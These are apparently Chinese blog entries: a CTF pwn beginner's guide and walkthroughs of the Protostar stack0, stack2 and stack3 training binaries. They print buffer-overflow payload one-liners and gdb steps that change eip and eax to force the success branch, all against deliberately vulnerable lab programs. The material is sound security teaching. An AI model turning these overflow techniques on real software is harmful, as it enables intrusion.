<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的<strong>GREENIE</strong>变量内容 </p>
<h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><p>任何计算机编程语言的两个基本组成部分，变量和常量。就像数学方程式中的自变量一样。变量和常量都代表唯一的内存位置，其中包含程序在其计算中使用的数据。两者的区别在于，变量在执行过程中可能会发生变化，而常量不能重新赋值</p>
<p>这里只举几个常见的环境变量</p>
<h4 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h4><p>包含了一些目录列表，作用是终端会在这些目录中搜索要执行的程序<br> 查看$PATH环境变量</p>
<pre class="line-numbers language-none"><code class="language-none">echo $PATH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="HOME"><a href="#HOME" class="headerlink" title="$HOME"></a>$HOME</h4><p>包含了当前用户的主目录</p>
<pre class="line-numbers language-none"><code class="language-none">echo $HOME<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="PWD"><a href="#PWD" class="headerlink" title="$PWD"></a>$PWD</h4><p>包含了当前用户目前所在的目录位置</p>
<pre class="line-numbers language-none"><code class="language-none">echo $PWD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a href="https://en.wikipedia.org/wiki/Environment_variable">关于环境变量更多信息</a></p>
<h3 id="破解程序"><a href="#破解程序" class="headerlink" title="破解程序"></a>破解程序</h3><p>回到正题</p>
<pre class="line-numbers language-none"><code class="language-none">variable &#x3D; getenv(&quot;GREENIE&quot;);
strcpy(buffer, variable);

  if(modified &#x3D;&#x3D; 0x0d0a0d0a) &#123;
      printf(&quot;you have correctly modified the variable\n&quot;);
  &#125; else &#123;
      printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量 </p>
<pre class="line-numbers language-none"><code class="language-none">export GREENIE&#x3D;$(python -c &quot;print &#39;A&#39;*(4*16)+&#39;\x0a\x0d\x0a\x0d&#39;&quot;); .&#x2F;stack2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 直接运行就能成功破解了 </p>
<p><img src="/img/1731310880852.png"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn入门指南</title>
    <url>/2021/1020bb48.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="PWN——从入门到入土"><a href="#PWN——从入门到入土" class="headerlink" title="PWN——从入门到入土"></a>PWN——从入门到入土</h1><h3 id="咚-咚-咚"><a href="#咚-咚-咚" class="headerlink" title="咚!咚!咚!"></a>咚!咚!咚!</h3><hr>
<p><del>从入门到入土之路开始了</del></p>
<blockquote>
<p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 。</p>
</blockquote>
<p>在CTF比赛中，pwn题主要是考察对<strong>二进制漏洞的发掘和利用</strong>，在此之上你必须要对<strong>计算机操作系统</strong>的 底层有一定的了解，这也是为什么pwn的入门门槛是所有方向中最高的原因之一。当然如果你是0基础的<strong>猛新</strong>也不用担心，因为基本上没有人是在所有关于操作系统的课程都上完过后才去学习pwn的，ctf为你提供了一个学习的平台，你可以一边拓展你的知识面一边享受pwn的乐趣。</p>
<h2 id="学习Pwn，你必须了解或掌握的知识"><a href="#学习Pwn，你必须了解或掌握的知识" class="headerlink" title="学习Pwn，你必须了解或掌握的知识"></a>学习Pwn，你必须了解或掌握的知识</h2><ol>
<li><strong>C语言</strong></li>
<li><strong>汇编语言</strong></li>
<li><strong>最基础的python</strong></li>
<li><strong>IDA等pwntools的使用</strong></li>
<li><strong>计算机组成原理</strong></li>
<li><strong>计算机操作系统</strong></li>
<li><strong>编译原理</strong></li>
</ol>
<p>这里推荐两本相关书籍，有意学习<strong>Pwn</strong>方向的同学可以留心一下</p>
<ul>
<li><strong>《CTF竞赛权威指南 pwn篇》</strong>（方便快速入门）</li>
<li><strong>《汇编语言（第4版）》</strong>（王爽著）</li>
</ul>
<p>同时这里也建议多关注一些论坛，比如吾爱破解，安全客，先知社区，freebuf，看雪等等，在这上面你 能学到不少漏洞利用相关姿势，可以在摸鱼的时候浏览查看</p>
<h2 id="Pwn的解题流程"><a href="#Pwn的解题流程" class="headerlink" title="Pwn的解题流程"></a>Pwn的解题流程</h2><h3 id="1-关于环境"><a href="#1-关于环境" class="headerlink" title="1.关于环境"></a>1.关于环境</h3><p>如果你是windows平台的话，首先你需要一台<strong>linux虚拟机</strong>，这里推荐使用<strong>ubuntu18.04</strong>，因为大多数 pwn题的部署环境都是<strong>ubuntu</strong>，便于你本地的调试，有了这样一台虚拟机后，你就可以在上面本地或者 远程调试pwn题了 <del>（但我个人也在经常使用<strong>kali</strong>，因为自带pwntools，解题有时还是很方便的）</del></p>
<p>注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢，可以在清华镜像源里去下载需要的Linux版本</p>
<p>同时，你需要安装pwntools这个python库，它是你在面对pwn题时最有力的工具，用它来get一个个 shell吧（安装方法详情请见百度） 在windows下你则需要<strong>IDA</strong>这个静态分析工具，建议在做题之前先在网上好好了解一下IDA的使用，会极大方便接下来的做题</p>
<h3 id="2-举个栗子"><a href="#2-举个栗子" class="headerlink" title="2.举个栗子"></a>2.举个栗子</h3><p>拿到一个pwn题，第一时间便是<strong>检查保护机制</strong></p>
<pre class="line-numbers language-none"><code class="language-none">1|ret2text checksec ret2text2|Arch: i386-32-little3|RELRO: Partial RELRO4|Stack: No canary found5|NX: NX enabled6|PIE: No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><strong>arch</strong>即程序所采用的架构，由上可知这是一个x86架构下的32位程序 </li>
<li><strong>RELRO</strong>(Relocation Read Only)，重定位表只读，这个保护并未完全开启，若完全开启则got表与 plt表只读不可写 </li>
<li><strong>canary</strong>，语义意为金丝雀； Stack canary 保护机制在刚进入函数时，在栈上放置一个标志 canary ，然后 在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生，同时结束程序运行。同上这个保护也未开启</li>
<li> <strong>NX</strong>(栈不可执行)，NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当 攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种 方法绕过</li>
<li> <strong>PIE</strong>(Position-Independent Executable, 位置无关可执行文件)，即程序运行时各个段（如代码段 等）加载的虚拟地址也是在装载时才确定</li>
</ul>
<p><strong>第二步</strong>，使用<strong>IDA静态工具</strong>查看ELF文件，通过反编译查看伪代码，读懂文件的内容，然后利用相应的方法解题(格式化字符串，栈溢出，整数溢出，堆溢出……)</p>
<p>一般到最后，就会利用python编写脚本（exp），然后拿到题目的flag</p>
<p><del>（不过最简单的pwn题，你只需要通过nc连接题目靶机端口，然后cat flag就能拿到flag）</del></p>
<p><img src="http://pr0b1em.top/img/cat.jpg" alt="img"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="Pwner-pwn-for-what"><a href="#Pwner-pwn-for-what" class="headerlink" title="Pwner: pwn for what?"></a>Pwner: pwn for what?</h3><hr>
<p>就CTF比赛这几个大类来看，pwn无疑是入门门槛最高的一个方向。它要求你具备以下基本能力：</p>
<ul>
<li>代码审计能力 </li>
<li>对整体程序流的认知与把握 </li>
<li>发掘程序中的漏洞点 </li>
<li>善用所有可利用的漏洞点来发起攻击</li>
</ul>
<h4 id="金句"><a href="#金句" class="headerlink" title="金句"></a>金句</h4><p>在整个getshell的过程中，困难是其次的，重要的是保持<strong>耐心与热情</strong>；在每个pwner的生涯中或许都会有过长久不能入眠的夜晚，面对屏幕上的一行行代码，逐行分析每个字符，思索各种可能存在的漏洞······最终，你或能在交互后成功在命令行里输入cat flag ，亦或在疑惑中查询他人的wp，无论结果与否，在潜移默化之中，你都在朝着未来的<strong>pwn master</strong>的方向砥砺前行。当你在CTF众多分支里选择Pwn的时候，摆在你面前的就不是一条轻松的道路，关于二进制的研究都是如此，所有的pwner都是从萌新一步步逐渐挣扎着、努力变成大佬的，毕竟在拿到shell后心里默念的”hacked by xxx”之中的喜悦之情是什么都难以掩藏的吧！</p>
<blockquote>
<p>Hack Just For Fun</p>
<p>双手合十成为自己的神，双手张开比肩神明</p>
</blockquote>
<p>希望你能在黑暗中探寻光明的道路，用你内心无尽的热爱点燃这Pwn世界。</p>
<blockquote>
<p><strong>XJUSEC{Love_Pwn_Forever!}</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场1 stack_zero</title>
    <url>/2024/111155bf.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1  stack_zero"></a>Pwn-protostar靶场1  stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;exploit.education&#x2F;protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>stack zero源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have changed the 'modified' variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"> </p>
<p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。 </p>
<h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p> 我们使用gdb打开程序进行进一步的分析 </p>
<pre class="line-numbers language-none"><code class="language-none">gdb &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731285612070.png"></p>
<p>然后查看汇编代码，了解程序堆栈如何工作</p>
<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel 参数让汇报代码美观一点
disassemble main  显示所有的汇编程序指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731285694825.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Dump of assembler code for function main:
0x080483f4 &lt;main+0&gt;:    push   ebp
0x080483f5 &lt;main+1&gt;:    mov    ebp,esp
0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0
0x080483fa &lt;main+6&gt;:    sub    esp,0x60
0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;
0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 &lt;main+33&gt;:   test   eax,eax
0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;
0x08048433 &lt;main+63&gt;:   leave
0x08048434 &lt;main+64&gt;:   ret
End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址 </p>
<p><img src="/img/1731285961101.png"></p>
<pre class="line-numbers language-none"><code class="language-none">0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址 </p>
<pre class="line-numbers language-none"><code class="language-none">0x080483fa &lt;main+6&gt;:    sub    esp,0x60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 然后esp减去0x60</p>
<pre class="line-numbers language-none"><code class="language-none">0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 在内存移动的位置为0，在堆栈上的偏移为0x5c<br> 段地址+偏移地址=物理地址<br> <strong>举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址</strong> </p>
<pre class="line-numbers language-none"><code class="language-none">0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p> lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈<br> 然后DWORD PTR要取eax的地址到esp中<br> 调用gets函数 </p>
<pre class="line-numbers language-none"><code class="language-none">0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 &lt;main+33&gt;:   test   eax,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 然后对比之前设置的值，0，用test来检查 </p>
<p>接下来就是if的循环操作</p>
<pre class="line-numbers language-none"><code class="language-none">0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><h3 id="方法一：溢出"><a href="#方法一：溢出" class="headerlink" title="方法一：溢出"></a>方法一：溢出</h3><p>我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。 </p>
<pre class="line-numbers language-none"><code class="language-none">b *0x0804840c     #断点意思就是让程序执行到此“停住”，不再往下执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里 </p>
<pre class="line-numbers language-none"><code class="language-none">b *0x08048411<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731286435341.png"></p>
<p>然后设置</p>
<pre class="line-numbers language-none"><code class="language-none">define hook-stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令 </p>
<pre class="line-numbers language-none"><code class="language-none">info registers   &#x2F;&#x2F;显示寄存器里的地址
x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p> 然后我们输入run运行程序到第一个断点 </p>
<p><img src="/img/1731286657496.png"></p>
<p><img src="/img/1731286826301.png"></p>
<p> 现在我们马上就要执行gets函数了，输入n执行gets函数（单步执行）</p>
<p> 我们随意输入一些内容，按下回车键 </p>
<p><img src="/img/1731286911539.png"></p>
<p><img src="/img/1731287011867.png"></p>
<p>可以看到0x61是a的ascii码</p>
<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c            &#x2F;&#x2F;查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731287066725.png"></p>
<p> 算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'print "a"*(16*4+4)'</span> <span class="token operator">|</span> <span class="token operator">/</span>opt<span class="token operator">/</span>protostar<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731287448288.png"></p>
<p> 可以看到，我们已经成功打印出了正确的字符 </p>
<h3 id="方式二：更改eip寄存器的值"><a href="#方式二：更改eip寄存器的值" class="headerlink" title="方式二：更改eip寄存器的值"></a>方式二：更改eip寄存器的值</h3><p>寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在<strong>64</strong>位程序里叫做<strong>RIP</strong>，<strong>他是程序的指针</strong>，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行<br>重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">b main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 运行程序到断点处 </p>
<p> 查看所有寄存器的值 </p>
<pre class="line-numbers language-none"><code class="language-none">info registers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731287668724.png"></p>
<p><img src="/img/1731287789478.png"></p>
<p> 我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd </p>
<p> 查看程序汇编代码 </p>
<p><img src="/img/1731287864176.png"></p>
<p>如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the ‘modified’ variable也就是破解成功了<br>现在我们修改eip寄存器的值</p>
<pre class="line-numbers language-none"><code class="language-none">set $eip&#x3D;0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址 </p>
<p><img src="/img/1731287958947.png"></p>
<pre class="line-numbers language-none"><code class="language-none">n &#x2F;&#x2F;执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731287994713.png"></p>
<p>破解成功</p>
<h3 id="方式三：修改eax寄存器的值"><a href="#方式三：修改eax寄存器的值" class="headerlink" title="方式三：修改eax寄存器的值"></a>方式三：修改eax寄存器的值</h3><p> 最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the ‘modified’ variable </p>
<p> 在对比的地方下一个断点 </p>
<pre class="line-numbers language-none"><code class="language-none">b *0x08048415<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731288172489.png"></p>
<p> 查看所有寄存器里的值 </p>
<p><img src="/img/1731288229480.png"></p>
<p> 修改eax寄存器里的值 </p>
<pre class="line-numbers language-none"><code class="language-none">set $eax &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731288271210.png"></p>
<p> 然后继续运行程序 </p>
<p><img src="/img/1731288308240.png"></p>
<p>破解成功！</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场3 stack three，stack four</title>
    <url>/2024/11137b0b.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场3-stack-three，stack-four"><a href="#Pwn-protostar靶场3-stack-three，stack-four" class="headerlink" title="Pwn-protostar靶场3 stack three，stack four"></a>Pwn-protostar靶场3 stack three，stack four</h1><h2 id="Stack-Three"><a href="#Stack-Three" class="headerlink" title="Stack Three"></a>Stack Three</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack three源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  fp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"calling function pointer, jumping to 0x%08x\n"</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p>这个程序首先定义了一个win函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用这个win函数会输出code flow successfully changed，表示我们成功破解了程序</p>
<p>然后在mian函数内定义了一个<a href="https://so.csdn.net/so/search?q=%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">指针变量</a>fp和字符型变量buffer，buffer存储的字符大小为64位</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">volatile</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="什么是指针？"><a href="#什么是指针？" class="headerlink" title="什么是指针？"></a>什么是指针？</h4><p>在C语言中，指针是一种特殊的<a href="https://so.csdn.net/so/search?q=%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">变量类型</a>，它存储了一个内存地址。这个内存地址可以是其他变量或数据结构在内存中的位置</p>
<p>指针提供了直接访问和操作内存中数据的能力。通过指针，我们可以间接地访问、修改和传递数据，从而不需要直接对变量本身进行操作</p>
<pre class="line-numbers language-none"><code class="language-none">fp &#x3D; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将fp的值设为0表示一个无效的指针，即它不指向任何有效的<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80&spm=1001.2101.3001.7020">内存地址</a>。这样做可以用来初始化指针变量，或者将指针重置为空指针</p>
<p>之后程序会使用gets函数接收用户的输入，并将接受到的字符串存储在buffer变量里，gets函数是一个危险的函数，他会造成缓冲区溢出</p>
<p> 程序接受输入后会进行一个if判断 </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"calling function pointer, jumping to 0x%08x\n"</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>if(fp)检查fp是否指向了某个有效的函数。如果fp不为空（即非零），则输出calling function pointer, jumping to 0x%08x，然后执行函数指针 fp 所指向的函数</p>
<p>也就是说，我们需要溢出覆盖fp设置的值，将fp原本的值改为win函数的地址，之后进入if判断后，会执行win函数</p>
